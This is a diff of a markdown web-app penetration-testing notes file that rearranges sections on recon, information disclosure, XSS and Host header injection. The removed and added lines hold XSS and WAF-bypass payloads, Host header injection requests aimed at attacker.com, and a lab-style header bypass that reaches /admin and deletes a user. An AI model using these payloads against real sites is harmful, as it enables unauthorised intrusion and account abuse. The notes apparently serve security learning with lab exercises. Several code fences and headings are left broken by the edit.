@@ -1,56 +1,8 @@
 <img src="https://github.com/Anvesh464/Web_APP_Test/blob/main/Pilot%20Testing/media/Ashok%20Findings.jpeg?raw=true" width="600">
 
-* [SQL Injection](https://github.com/Anvesh464/Web_APP_Test/tree/main/SQL%20Injection/)
-* [Server Side Request Forgery](https://github.com/Anvesh464/Web_APP_Test/tree/main/Server%20Side%20Request%20Forgery/)
-* [Server Side Template Injection](https://github.com/Anvesh464/Web_APP_Test/tree/main/Server%20Side%20Template%20Injection/)
-* [Upload Insecure Files](https://github.com/Anvesh464/Web_APP_Test/tree/main/Upload%20Insecure%20Files/)
-* [Web Cache Deception](https://github.com/Anvesh464/Web_APP_Test/tree/main/Web%20Cache%20Deception/)
-* [Web Sockets](https://github.com/Anvesh464/Web_APP_Test/tree/main/Web%20Sockets/)
-* [XSLT Injection](https://github.com/Anvesh464/Web_APP_Test/tree/main/XSLT%20Injection/)
-* [XXE Injection](https://github.com/Anvesh464/Web_APP_Test/tree/main/XXE%20Injection/)
-* [XSS Injection](https://github.com/Anvesh464/Web_APP_Test/tree/main/XSS%20Injection/)
-  
-Make life easier, not harder.
-[PayloadsAllTheThings - GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings)
+Make life easier, not harder.[PayloadsAllTheThings - GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings)
 
-### Application version-related exploits
-Search in [exploit-db](https://www.exploit-db.com/)
-
-## Addons 
-
-- Hackbar, CounterXSS, FindSomething, XSS辅助工具, XSS, Hack-Tools, WhatCMS, 
-- FoxyProxy Standard
-- Wappalyzer
-- Cookies Manager+
-- SQL Inject Me
-- XSS Me
-- Tamper Data
-- SecurityFocus Vulnerabilities search plugin
-- Packet Storm search plugin
-- Offsec Exploit-db Search
-
-## Vulnerability Categories
-
-- XSS
-- Host Header Injection
-- URL Redirection
-- Parameter Tampering
-- HTML Injection
-- File Inclusion
-- SPF Record Misconfiguration
-- Insecure CORs Configuration
-- SSRF
-- Critical File Disclosure
-- Source Code Disclosure
-- CSRF
-- Subdomain Takeover
-- SQL Injection
-- Command Injection
-- File Upload Vulnerabilities
-- XML Injection
-
-## cURL to Burp Request Command
-curl -x 127.0.0.1:8080
+### Application version-related exploits  Search in [exploit-db](https://www.exploit-db.com/)
 
 ## XSS Payload Example
 ```html
@@ -58,87 +10,6 @@ curl -x 127.0.0.1:8080
 ```
 # Enumeration
 
-## 1. Information Gathering
-
-- has to know the terminology and gather information about the version, Server, Frameworks, and Default credentials.
-- Identify previous vulnerabilities related to the application.
-
-### Injection Points
-
-- Where vulnerabilities can exist.
-- Injection paint is vulnerability location.(parameters)
-
-### Information Flow
-
-1. Site
-2. Subdomains
-3. Select unpopular websites
-4. Find IP Address
-5. Which programming language they are using
-6. Open ports and services
-7. Site:eur.nl responsible disclosure
-
-### Tools for Finding Subdomains
-
-- [VirusTotal](https://www.virustotal.com/gui/home/search)
-- [Subbrute](https://github.com/TheRook/subbrute)
-  ```bash
-  ./subbrute.py -c 50 example.com > example.com
-  ```
-- [Altdns](https://github.com/infosec-au/altdns)
-- [Netcraft](https://searchdns.netcraft.com/)
-- [HTTP Status Checker](https://httpstatus.io/)
-- [SubFinder](https://github.com/projectdiscovery/subfinder)
-
-sort out subdomain unpapularity (Less travel route)
-
-### Finding IP Address & Open Ports
-
-- Ping to find tha ip address or use the namp to know the open ports aggresive scanning os and version information & vuln scanning.
-- If it is not in scope do the poty numnber 80 and 443 for vulnerability scanning.
-
-### Server Information & Banner Grabbing
-
-```bash
-whatweb domain.name
-nikto -h domain.name
-nc domain.name 80
-nc head / http/1.0
-telnet
-waplayzer
-```
-## Information disclosure
-
-GET /product?productId=aaa
-We find the debug page in “/cgi-bin/phpinfo.php”:
-
-![image](https://github.com/user-attachments/assets/7028eb48-100c-4f87-a0d6-1efeb49c46a5)
-
-We can find the secret key ("8f4xrr692ckcxycofkaupwwu37cse6io") in the “Environment” section:
-![image](https://github.com/user-attachments/assets/17a0365b-bd9f-40f5-9658-c7552440bdd4)
-There is a /robots.txt file:
-forcefully generating an error messages 
-check .js file for disclosure credentials
-The directory .git/ exists and allows directory listing:
-
-After logging in, send a request with the TRACE HTTP method, which reveals the header “X-Custom-IP-Authorization”:
-![image](https://github.com/user-attachments/assets/a2d7fc98-b0a8-4520-aba9-48f6645213ef)
-It is possible to access /admin with:
-```
-GET /admin HTTP/2
-...
-X-Custom-Ip-Authorization: 127.0.0.1
-```
-![image](https://github.com/user-attachments/assets/6adc9f6e-9d48-4529-9d5b-5e2138f31296)
-And then delete the user with:
-```
-GET /admin/delete?username=carlos HTTP/2
-...
-X-Custom-Ip-Authorization: 127.0.0.1
-```
-![image](https://github.com/user-attachments/assets/409feb4b-ed8d-45dd-9348-625d13a5cc0d)
-
----
 ## API Key and Token Leaks
 
 ```markdown
@@ -288,9 +159,7 @@ Common examples of Business Logic Errors.
 - Search bars
 - Registration forms
 - Feedback forms
-- Contact us forms etc....
-
-### How to Hunt for XSS
+- Contact us forms etc.... where input is reflected and sometime extra parameters
 
 1. Find an input parameter and provide input If input reflects or is stored, there may be XSS.
 2. Try executing JavaScript if you succeed to execute any javascript there then there is a XSS vulnerability.
@@ -401,7 +270,9 @@ xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
 anythinglr00</script><script>alert(document.domain)</script>uxldz
 anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
 <svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
-
+<svg/OnLoad="`${prompt``}`">
+<svg/onload=alert`bohdan`>
+'onmouseover='alert(1);
 ```
 
 1. Characters ' " < > / // ( ) ^ script img svg div alert prompt 
@@ -435,37 +306,11 @@ http://leettime.net/xsslab1/
 - Bypass using Octal Encoding
 - Bypass using Common WAF Bypass
 
-### Cloudflare XSS Bypass
-
-```html
-<svg/OnLoad="`${prompt``}`">
-<svg/onload=alert`bohdan`>
-```
-
 ### Practical XSS Exercises
-
+```
 - [Prompt.ml](https://prompt.ml/0)
 - [XSS Lab](http://leettime.net/xsslab1/)
 ```
-# 4. Manual XSS Vector Building
-
-## Steps to Find & Exploit XSS
-
-1. Find an input field that reflects input.
-2. Check response in **view-source**.
-3. Close any open tags.
-4. Use event handlers like `onmouseover` for bypassing sanitization.
-
-Example: <input type="text" name="name" value='hello'>
-<input type="submit" name="submit" value="search">
-Payload: 'onmouseover='alert(1);
-# References
-
-- [PayloadsAllTheThings - XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
-- [LeetTime XSS Labs](http://leettime.net/xsslab1/)
-- [Prompt.ml](https://prompt.ml/)
-```
----
 # XSS & Host Header Injection Testing Guide
 
 ## 1. First SDIPER Application
@@ -556,6 +401,7 @@ Payload: 'onmouseover='alert(1);
 ```
 ```
 ---
+
 # Host Header Injection
 ## 1. Overview
 - Exploiting host header injection in **virtual hosting environments**.
@@ -565,51 +411,18 @@ Payload: 'onmouseover='alert(1);
 - [https://portswigger.net/bappstore/3908768b9ae945d8adf583052ad2e3b3 headi -url http://target.com](https://www.blackhatethicalhacking.com/tools/headi/) headi -url http://target.com
 - https://github.com/inpentest/HostHeaderScanner bash script.sh -l urls.txt
 
-## 2. Attack Methods
-### Method 1:
-```http
-Host: bing.com
-```
-### Method 2:
-```http
-Host: bing.com
-X-Forwarded-Host: realweb.com
-```
-### Method 3:
-```http
-Host: realweb.com
-X-Forwarded-Host: bing.com
-```
-### Method 4:
-```http
 Referer: https://www.bing.com/
 Try to change host and referer header because few host is verify for referer header information. 
 also do the same first three attack to insert the referer header (Change referer header)
 ```
-
-## 3. Host Header Injection with Web Cache Poisoning
-- Follow the above methods.
-- Click anywhere on the web application.
-- If redirected to `bing.com`, the site is vulnerable.
-
-## 4. Password Reset Poisoning
+```
+## Password Reset Poisoning
 - Obtain a **password reset link**.
 - Modify the `Host` header.
 
-## 5. Host Header Attack for XSS
-- Check if the response contains:
-  ```html
-  https://bing.com/?locald">
-  ```
-- Use the payload:
-  ```html
-  Host: bing.com"><script>alert(1)</script>
-  ```
-
-## 6. Host Header Injection on Referer Header
+## Host Header Injection on Referer Header
 - Modify headers:
   ```http
-  Connection: close
   Referer: https://www.bing.com/
   ```
 
@@ -633,6 +446,10 @@ X-Forwarded-Host: attacker.com
 GET https://vulnerable.com/ HTTP/1.1
 Host: attacker.com
 
+Referer: https://www.bing.com/
+Connection: close
+
+
 GET / HTTP/1.1
 Host: vulnerable.com
 X-Host: attacker.com
@@ -642,18 +459,7 @@ Forwarded: host=attacker.com
 ```
 Based on your GitHub lab on [HTTP Host Header Attacks](https://github.com/Anvesh464/Portswigger-Labs/tree/main/20%20-%20HTTP%20Host%20header%20attacks), here's a **step-by-step breakdown** for each attack scenario from the PortSwigger labs.
 
-To identify Host Header Injection vulnerabilities, focus on these key parameters and headers:
-
-- **Host**: The primary header to test. Try injecting arbitrary domains.
-- **X-Forwarded-Host**: Often used by proxies; can override the Host header.
-- **X-Host**, **X-Forwarded-Server**, **X-HTTP-Host-Override**, **Forwarded**: Alternative headers that may be parsed by backend systems.
-- **Absolute URLs in request line**: Some servers prioritize the URL over the Host header.
-- **Duplicate Host headers**: Can cause discrepancies between frontend and backend parsing.
-- **Line wrapping or malformed headers**: Indentation or spacing tricks may bypass validation.
-
 🧨 **Common Payloads to Bypass WAFs**
-
-Here’s a cheat sheet of payloads that may help bypass WAFs during Host Header Injection testing:
 
 | Header Variant              | Payload Example              |
 |----------------------------|------------------------------|
@@ -672,30 +478,6 @@ Here’s a cheat sheet of payloads that may help bypass WAFs during Host Header 
 - Try **subdomain tricks**: `Host: attacker.vulnerable.com`
 - Use **encoded characters**: `%0d%0aHost: evil.com`
 - Leverage **proxy headers**: Some WAFs ignore `X-Forwarded-Host`
-
-Sure! Based on the content from the GitHub repository you linked, here are the **specific techniques demonstrated in the PortSwigger Labs for HTTP Host header attacks**:
-
-# **1. List of Vulnerabilities (Full Set)**
-
-1. **Web Cache Poisoning**
-2. **Password Reset Link Poisoning**
-3. **Host Header Injection**
-4. **Open Redirect / URL Confusion**
-5. **Virtual Host Routing Bypass**
-6. **SSRF via Host Header**
-7. **Access Control Bypass**
-8. **CORS Bypass Using Host Reflection**
-9. **Log Injection**
-10. **Firewall / WAF Bypass Cases** *(NEW)*
-11. **Domain Validation Bypass** *(NEW)*
-12. **Header Override Bypass** *(NEW)*
-13. **Unicode / Encoding Bypass** *(NEW)*
-
----
-
-# **2. Sample Payloads (Including Bypass Payloads)**
-
-All payloads are ready to use for pentesting.
 
 ---
 
